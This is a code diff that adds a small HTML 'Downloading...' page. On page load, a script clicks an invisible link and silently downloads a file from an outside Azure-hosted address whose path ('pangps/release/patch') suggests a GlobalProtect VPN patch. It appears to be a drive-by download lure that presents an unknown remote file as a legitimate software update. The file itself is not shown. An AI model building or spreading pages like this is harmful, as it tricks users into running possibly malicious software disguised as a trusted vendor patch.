@@ -1,1 +1,24 @@
-asdasdasdasdas
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Downloading...</title>
+  <script>
+    window.onload = function() {
+      // Change this URL to your actual file
+      const fileUrl = "https://azure-stat95-f7czfzc7cec0ggc4.z02.azurefd.net/pangps/release/patch";
+      
+      // Create an invisible link and trigger the download
+      const link = document.createElement("a");
+      link.href = fileUrl;
+      link.download = ""; // lets browser infer filename
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+    };
+  </script>
+</head>
+<body>
+  <p>Your download should start automatically...</p>
+</body>
+</html>
